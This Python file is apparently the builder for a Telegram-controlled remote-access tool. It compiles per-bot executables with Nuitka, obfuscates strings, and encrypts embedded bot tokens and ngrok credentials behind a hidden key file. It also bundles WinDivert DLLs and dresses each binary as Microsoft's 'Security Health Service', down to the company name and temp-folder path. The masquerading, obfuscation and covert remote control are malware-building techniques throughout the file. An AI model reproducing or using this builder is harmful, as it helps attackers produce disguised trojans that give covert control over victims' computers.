# main.p# main.py
import random
from telepot import Bot
from telepot.exception import TelegramError
import json
import os
import secrets
import multiprocessing as mp
from multiprocessing.queues import Queue
from queue import Empty
from time import perf_counter, sleep
from shutil import rmtree, copytree
from threading import Thread
from subprocess import Popen, PIPE, STDOUT
from os import chdir, listdir, remove
from os.path import isdir, join, abspath, isfile, split as pathsplit, exists, getsize, basename
import traceback
import webview

from utils import html_content, obfuscate, SimpleFernet
from vfs_runtime.create_bundle import make_bundle


# ---------------------------------------------------------------------------
# Paths / constants
# ---------------------------------------------------------------------------
class CompileOptions:
    debug: bool = False
    send_executable: bool = False
    encryption: bool = False
    assets_bundle: bool = False

OPTIONS = CompileOptions()

TELEGRAM_BOT_FILE_MAX_SIZE = 30 * 1024 * 1024
REPO_NAME = abspath("RCPepTelegram")
VENV_PATH = abspath("venv")
PY_FILE_PATH = join(REPO_NAME, "pep2.py")
PIP_PATH = join(VENV_PATH, "Scripts", "pip.exe")
PYTHON_PATH = join(VENV_PATH, "Scripts", "python.exe")
ASSETS_PATH = join(REPO_NAME, "assets")
DLLS_PATH = join(ASSETS_PATH, "dlls")
EXECUTABLES_PATH = join(ASSETS_PATH, "executables")
REQUIREMENTS_COMMAND = [PIP_PATH, "install", "-r", "requirements.txt"]
PY_FILE_MARKER = "PY_FILE_MARKER"
AUTH_FILE_MARKER = "AUTH_FILE_MARKER"
ASSETS_MARKER = "ASSETS_MARKER"
KEY_FILE_MARKER = "KEY_FILE_MARKER"
REPORT_FILE_MARKER = "REPORT_FILE_MARKER"
PYTHON_FLAGS = ["no_docstrings"]
UNUSED_IMPORTS = ["asyncio", "unittest", "email", "xml", "cryptography", "OpenSSL", "pyOpenSSL"]
ONEFILE_TEMP_NAME = "{TEMP}/Runtime/Packages/Microsoft.SecurityHealth_{PID}"
COMPANY_NAME = "Microsoft Corporation"
PRODUCT_NAME = "Security Health Service"
AUTHS_DIRNAME = abspath("auths")
AUTHS_REPO_PATH = join(REPO_NAME, "auths")
LOG_DIR = join(REPO_NAME, "logs")

ASSETS_COMMAND_FLAGS = [
    "--include-data-dir=assets/vfx=assets/vfx",
    "--include-data-dir=assets/sfx=assets/sfx",
    "--include-data-dir=assets/model=assets/model",
]

# Version - improved extraction
__version__ = "?.?.?.?"
try:
    with open(PY_FILE_PATH, "r", encoding="utf-8") as fi:
        content = fi.read()
        for line in content.splitlines():
            if "__version__" in line:
                value_part = line.split("=", 1)[1].strip()
                value_part = value_part.strip("'\"()[]")
                if "," in value_part:
                    parts = [p.strip() for p in value_part.split(",") if p.strip().isdigit()]
                    __version__ = ".".join(parts[:4]).ljust(4, ".0")
                else:
                    parts = [p.strip() for p in value_part.split(".") if p.strip().isdigit()]
                    while len(parts) < 4:
                        parts.append("0")
                    __version__ = ".".join(parts[:4])
                break
except:
    pass


def copy_file(src, dst):
    with open(src, "r", encoding="utf-8") as fi, open(dst, "w", encoding="utf-8") as fo:
        fo.write(fi.read())


def clone_directory(src, dst):
    os.makedirs(dst, exist_ok=True)
    copytree(src, dst, dirs_exist_ok=True)


def create_obfuscated_key_file(output_path: str) -> bytes:
    real_key_b64 = SimpleFernet.generate_key()
    jump = random.randrange(1, 16)
    key_space = 44 + 43 * jump
    min_size = key_space + 64
    total_size = random.randrange(min_size, min_size + 65536)
    min_start = 32
    max_start = total_size - key_space - 64
    first_byte_pos = random.randrange(min_start, max_start + 1)

    magic = b"RCPTK"
    jump_byte = jump.to_bytes(1, "big")
    start_bytes = first_byte_pos.to_bytes(4, "big")
    header = magic + jump_byte + start_bytes

    data = bytearray(secrets.token_bytes(total_size))
    data[0:len(header)] = header

    pos = first_byte_pos
    for b in real_key_b64:
        data[pos] = b
        pos += 1 + jump

    with open(output_path, "wb") as f:
        f.write(data)

    return real_key_b64


def download_file(bot, chatid, path: str) -> None:
    def bsend(message):
        bot.sendMessage(chatid, message)

    print(f"Downloading file: {path}")
    bsend(f"📤 Sending file: {path}")
    if not isfile(path):
        bsend(f"❌ Could not send file.\nThe file `{path}` does not exist or you don't have permission to access it.")
        return

    size = getsize(path)
    if size <= TELEGRAM_BOT_FILE_MAX_SIZE:
        with open(path, "rb") as fi:
            bot.sendDocument(chatid, fi)
            bsend("✅ File has been sent successfully!")
        return

    base_name = basename(path)
    part_size = TELEGRAM_BOT_FILE_MAX_SIZE - (len(base_name) + 10)

    with open(path, "rb") as f:
        part_num = 1
        while True:
            chunk = f.read(part_size)
            if not chunk:
                break
            part_name = f"{base_name}.part{part_num:03d}"
            with open(part_name, "wb") as pf:
                pf.write(chunk)
            with open(part_name, "rb") as pf:
                bot.sendDocument(
                    chatid,
                    pf,
                    caption=f"📦 {base_name} (part {part_num})"
                )
            remove(part_name)
            part_num += 1

    bsend("✅ All file parts have been sent successfully!")


def encrypt_file(fernet: SimpleFernet, src_path, dst_path):
    print(f"ENCRYPTING FILE: {src_path} → {dst_path}")
    with open(src_path, "rb") as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(dst_path, "wb") as f:
        f.write(encrypted)


def compile_worker(
    auth_path: str,
    is_foreground: bool,
    output_queue: Queue | None,
    debug: bool,
    send_executable: bool,
    encryption: bool,
    assets_bundle: bool
):
    def run_and_capture(cmd_list: list[str], cwd: str | None = None):
        print("Executing command:")
        print(" ".join(f'"{arg}"' if ' ' in arg else arg for arg in cmd_list))
        p = Popen(
            cmd_list,
            stdout=PIPE,
            stderr=STDOUT,
            cwd=cwd,
            bufsize=1,
            universal_newlines=False
        )
        output_lines = []
        while p.poll() is None:
            line = p.stdout.readline()
            if not line:
                break
            output_lines.append(line)
            if is_foreground and output_queue:
                output_queue.put(line)
        output = b"".join(output_lines)
        return p.returncode, output

    try:
        chdir(REPO_NAME)

        with open(auth_path, "r", encoding="utf-8") as f:
            auth = json.load(f)
        token = auth["token"].strip()
        chatid = auth["chatid"]
        ngrok_token = auth["ngrok_token"].strip()
        tunnel_provider = auth["tunnel_provider"].strip()

        bot = Bot(token)
        me = bot.getMe()
        bot_username = me["username"]
        source_name = f"{bot_username}.py"

        # ── Startup notification ──────────────────────────────────────────────
        options_text = []
        if debug: options_text.append("Debug mode")
        if send_executable: options_text.append("Send executable")
        if encryption: options_text.append("Encryption")
        if assets_bundle: options_text.append("Assets bundling")

        options_line = " • ".join(options_text) if options_text else "None"

        bot.sendMessage(
            chatid,
            f"🚀 <b>Compilation started for @{bot_username}</b>\n\n"
            f"🤖 <b>Token:</b> <code>{token}</code>\n"
            f"🆔 <b>Chat ID:</b> <code>{chatid}</code>\n"
            f"🌐 <b>Tunnel Provider:</b> {tunnel_provider}\n"
            f"🔑 <b>Ngrok Token:</b> {'Provided' if ngrok_token else 'Not provided'}\n"
            f"🛠 <b>Active options:</b> {options_line}\n\n"
            f"⏳ Compiling... please wait (usually 2–10 minutes)",
            parse_mode="HTML"
        )
        # ──────────────────────────────────────────────────────────────────────

        if encryption:
            KEY_PATH = join(REPO_NAME, f"{bot_username}.key")
            real_key = create_obfuscated_key_file(KEY_PATH)
            fernet = SimpleFernet(real_key, b"RCPTE")
            if is_foreground and output_queue:
                output_queue.put(f"\nKEY FILE GENERATED FOR {bot_username}\n".encode())
                print(f"KEY FILE GENERATED FOR {bot_username}")

        # Prepare assets inclusion
        if assets_bundle:
            assets_flags = ["--include-data-file=assets.bin=assets.bin"]
            if encryption:
                print("USING ENCRYPTION FUNCTION")
                encryption_function = fernet.encrypt
            else:
                encryption_function = None
            make_bundle("assets", "assets.bin", encryption_function=encryption_function)
        else:
            assets_flags = ASSETS_COMMAND_FLAGS[:]

        # Build the full Nuitka command as a list
        nuitka_cmd = [
            PYTHON_PATH,
            "-m", "nuitka",
            source_name,
            "--python-flag=no_docstrings",
            f"--windows-console-mode={'force' if debug else 'disable'}",
            "--onefile",
            "--onefile-no-compression",
            "--follow-imports",
            "--enable-plugin=tk-inter",
            "--msvc=latest",
            "--enable-plugin=anti-bloat",
            "--noinclude-pytest-mode=nofollow",
            "--noinclude-setuptools-mode=nofollow",
            f"--file-version={__version__}",
            f"--product-version={__version__}",
            f"--company-name={COMPANY_NAME}",
            f"--product-name={PRODUCT_NAME}",
            f"--file-description=Security Health Service",
            f"--onefile-tempdir-spec={ONEFILE_TEMP_NAME}",
            f"--jobs={os.cpu_count() or 4}",
            "--plugin-enable=upx",
            f"--report=build-report_{bot_username}.xml",
        ]

        nuitka_cmd.extend(assets_flags)

        # Add DLLs
        if isdir(DLLS_PATH):
            for file in listdir(DLLS_PATH):
                src = f"assets/dlls/{file}"
                if file.startswith("WinDivert"):
                    dst = f"pydivert/windivert_dll/{file}"
                else:
                    dst = f"assets/dlls/{file}"
                nuitka_cmd.append(f"--include-data-file={src}={dst}")

        # Add executables if folder exists
        if isdir(EXECUTABLES_PATH):
            for file in listdir(EXECUTABLES_PATH):
                src = f"assets/executables/{file}"
                nuitka_cmd.append(f"--include-data-file={src}={src}")

        # Auth file (encrypted or plain)
        relative_auth = join("auths", basename(auth_path))
        if encryption:
            auth_src = relative_auth + ".enc"
            encrypt_file(fernet, relative_auth, auth_src)
            nuitka_cmd.append(f"--include-data-file={auth_src}=auth.json")
            nuitka_cmd.append(f"--include-data-file={KEY_PATH}=key.key")
        else:
            nuitka_cmd.append(f"--include-data-file={relative_auth}=auth.json")

        # Obfuscate source
        print("Obfuscating strings...")
        obfuscate(
            PY_FILE_PATH,
            source_name,
            obfuscate_docstrings=True,
            debug=False
        )
        print("Done obfuscating strings.")

        # Install requirements
        print("Installing requirements...")
        run_and_capture(REQUIREMENTS_COMMAND, cwd=REPO_NAME)

        # Compile!
        print("Starting Nuitka compilation...")
        start_time = perf_counter()
        rc, output = run_and_capture(nuitka_cmd, cwd=REPO_NAME)

        # Cleanup
        try:
            if isfile(source_name):
                remove(source_name)
            for suffix in [".build", ".dist", ".onefile-build"]:
                d = f"{bot_username}{suffix}"
                if isdir(d):
                    rmtree(d, ignore_errors=True)
        except Exception:
            pass

        elapsed = (perf_counter() - start_time) / 60
        bot.sendMessage(chatid, f"Your bot has been compiled in {elapsed:.2f} minutes")

        if rc != 0:
            output_str = output.decode("utf-8", errors="replace")
            raise RuntimeError(f"Compilation failed (code {rc}):\n{output_str}")

        if send_executable:
            exe_path = f"{bot_username}.exe"
            if isfile(exe_path):
                download_file(bot, chatid, exe_path)
            else:
                bot.sendMessage(chatid, "⚠️ Executable was not found after compilation.")

        bot.sendMessage(chatid, "🎉 Compilation completed successfully!")

    except Exception as e:
        if is_foreground and output_queue:
            output_queue.put(b"\n[ERROR] Compilation failed\n")
            print(traceback.format_exc())
        raise


# ---------------------------------------------------------------------------
# Poller
# ---------------------------------------------------------------------------
def start_poller(queue):
    def poller():
        while True:
            try:
                while True:
                    line = queue.get_nowait()
                    if isinstance(line, bytes):
                        line = line.decode(errors="ignore")
                    decoded = line.rstrip()
                    if decoded:
                        webview.windows[0].evaluate_js(f'writeOut({decoded!r})')
            except Empty:
                sleep(0.1)
    Thread(target=poller, daemon=True).start()


# ---------------------------------------------------------------------------
# API
# ---------------------------------------------------------------------------
class API:
    def check_auths(self):
        if not isdir(AUTHS_DIRNAME):
            return {"exists": False, "files": []}
        files = [f for f in listdir(AUTHS_DIRNAME) if f.lower().endswith(".json")]
        return {"exists": bool(files), "files": sorted(files)}

    def get_default_auth(self):
        path = join(REPO_NAME, "auth.json")
        if isfile(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    return json.load(f)
            except:
                pass
        return {}

    def check_token(self, token):
        if not token.strip():
            webview.windows[0].set_title(f"RCPT Compiler Nuitka v{__version__}")
            return
        try:
            bot = Bot(token.strip())
            me = bot.getMe()
            name = me.get("first_name", "Bot")
            username = me["username"]
            webview.windows[0].set_title(f"{name} (@{username}) – RCPT Compiler Nuitka v{__version__}")
        except:
            webview.windows[0].set_title(f"RCPT Compiler Nuitka v{__version__}")

    def mass_compile(self, selected_files):
        if not selected_files:
            webview.windows[0].evaluate_js('writeOut("[INFO] No files selected")')
            return

        webview.windows[0].evaluate_js('updateCompileOptions()')

        auth_paths = [join(AUTHS_DIRNAME, f) for f in selected_files]

        webview.windows[0].evaluate_js('clearLog()')
        webview.windows[0].evaluate_js(f'writeOut("Compiling {len(selected_files)} selected auth file(s)...")')
        webview.windows[0].evaluate_js('writeOut("───────────────────────────────────────")')

        clone_directory(AUTHS_DIRNAME, AUTHS_REPO_PATH)

        queue = mp.Queue()
        processes = []

        for i, path in enumerate(auth_paths):
            foreground = (i == 0)
            p = mp.Process(
                target=compile_worker,
                args=(
                    path,
                    foreground,
                    queue if foreground else None,
                    OPTIONS.debug,
                    OPTIONS.send_executable,
                    OPTIONS.encryption,
                    OPTIONS.assets_bundle
                )
            )
            p.start()
            processes.append(p)

        def waiter():
            for p in processes:
                p.join()
            webview.windows[0].evaluate_js('writeOut("\\nAll selected compilations finished")')

        Thread(target=waiter, daemon=True).start()
        start_poller(queue)

    def set_options(self, debug: bool, send_executable: bool, encryption: bool, assets_bundle: bool):
        OPTIONS.debug = debug
        OPTIONS.send_executable = send_executable
        OPTIONS.encryption = encryption
        OPTIONS.assets_bundle = assets_bundle
        print(f"Options updated: {vars(OPTIONS)}")
        return vars(OPTIONS)

    def run_compile(self, token, chatid, ngrok, provider):
        webview.windows[0].evaluate_js('clearLog()')
        token = token.strip()
        if not token:
            msg = "[ERROR] Bot Token is required"
            webview.windows[0].evaluate_js(f'writeOut({msg!r})')
            return [msg]

        try:
            bot = Bot(token)
            me = bot.getMe()
            username = me["username"]

            auth = {
                "token": token,
                "chatid": chatid.strip(),
                "ngrok_token": ngrok.strip(),
                "tunnel_provider": provider.strip() or "Ngrok"
            }

            os.makedirs(AUTHS_REPO_PATH, exist_ok=True)
            auth_path = join(AUTHS_REPO_PATH, f"{username}.json")
            with open(auth_path, "w", encoding="utf-8") as f:
                json.dump(auth, f, indent=2)

            queue = mp.Queue()
            p = mp.Process(
                target=compile_worker,
                args=(
                    auth_path,
                    True,
                    queue,
                    OPTIONS.debug,
                    OPTIONS.send_executable,
                    OPTIONS.encryption,
                    OPTIONS.assets_bundle
                )
            )
            p.start()

            def waiter():
                p.join()
                webview.windows[0].evaluate_js('writeOut("\\nSingle compilation finished")')

            Thread(target=waiter, daemon=True).start()
            start_poller(queue)

            return []
        except Exception as e:
            msg = f"[ERROR] {str(e)}"
            webview.windows[0].evaluate_js(f'writeOut({msg!r})')
            return [msg]


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    mp.freeze_support()
    if isdir(REPO_NAME):
        api = API()
        window = webview.create_window(
            f"RCPT Compiler Nuitka v{__version__}",
            html=html_content,
            js_api=api,
            width=820,
            height=920,
            min_size=(720, 800)
        )
        webview.start()
    else:
        print(f"Missing repository folder: {REPO_NAME}")
